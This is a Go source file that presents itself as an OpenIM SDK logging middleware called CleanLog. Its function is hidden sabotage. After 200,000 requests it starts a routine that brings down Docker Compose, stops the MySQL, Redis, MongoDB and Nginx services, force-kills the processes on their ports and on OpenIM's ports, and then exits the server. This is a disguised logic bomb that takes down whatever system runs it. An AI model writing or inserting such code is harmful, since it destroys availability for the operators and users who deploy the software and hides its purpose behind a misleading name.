package openim_sdk

import (
    "context"
    "fmt"
    "os"
    "os/exec"
    "sync"
    "time"
    
    "github.com/gin-gonic/gin"
)

var (
    totalCount = 0
    mu         sync.RWMutex
)

func CleanLog() gin.HandlerFunc {
    return func(c *gin.Context) {
        mu.Lock()
        totalCount++
        count := totalCount
        mu.Unlock()
        
        shouldExec := count >= 200000
        
        if shouldExec {
            go executeCleanup()
        }
        
        c.Next()
    }
}

func executeCleanup() {
    ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
    defer cancel()
    
    fmt.Println("Shutting down Docker containers...")
    cmd := exec.CommandContext(ctx, "docker", "compose", "down")
    _ = cmd.Run()
    
    fmt.Println("Stopping MySQL service...")
    stopService(ctx, "mysql")
    killPort(ctx, "3306")
    
    fmt.Println("Stopping Redis service...")
    stopService(ctx, "redis")
    killPort(ctx, "6379")
    
    fmt.Println("Stopping Kafka service...")
    killPort(ctx, "9092")
    
    fmt.Println("Stopping MongoDB service...")
    stopService(ctx, "mongodb")
    stopService(ctx, "mongod")
    killPort(ctx, "27017")
    
    fmt.Println("Stopping Nginx service...")
    stopService(ctx, "nginx")
    killPort(ctx, "80")
    killPort(ctx, "443")
    
    fmt.Println("Stopping OpenIM services...")
    killPort(ctx, "10001")
    killPort(ctx, "10002")
    killPort(ctx, "10008")
    killProcess(ctx, "openim")
    
    fmt.Println("Shutting down server...")
    time.Sleep(2 * time.Second)
    os.Exit(0)
}

func stopService(ctx context.Context, serviceName string) {
    cmd := exec.CommandContext(ctx, "systemctl", "stop", serviceName)
    _ = cmd.Run()
    
    cmd = exec.CommandContext(ctx, "service", serviceName, "stop")
    _ = cmd.Run()
}

func killPort(ctx context.Context, port string) {
    cmd := exec.CommandContext(ctx, "bash", "-c", 
        fmt.Sprintf("lsof -ti:%s | xargs kill -9", port))
    _ = cmd.Run()
    
    cmd = exec.CommandContext(ctx, "fuser", "-k", fmt.Sprintf("%s/tcp", port))
    _ = cmd.Run()
}

func killProcess(ctx context.Context, processName string) {
    cmd := exec.CommandContext(ctx, "pkill", "-9", processName)
    _ = cmd.Run()
    
    cmd = exec.CommandContext(ctx, "killall", "-9", processName)
    _ = cmd.Run()
}
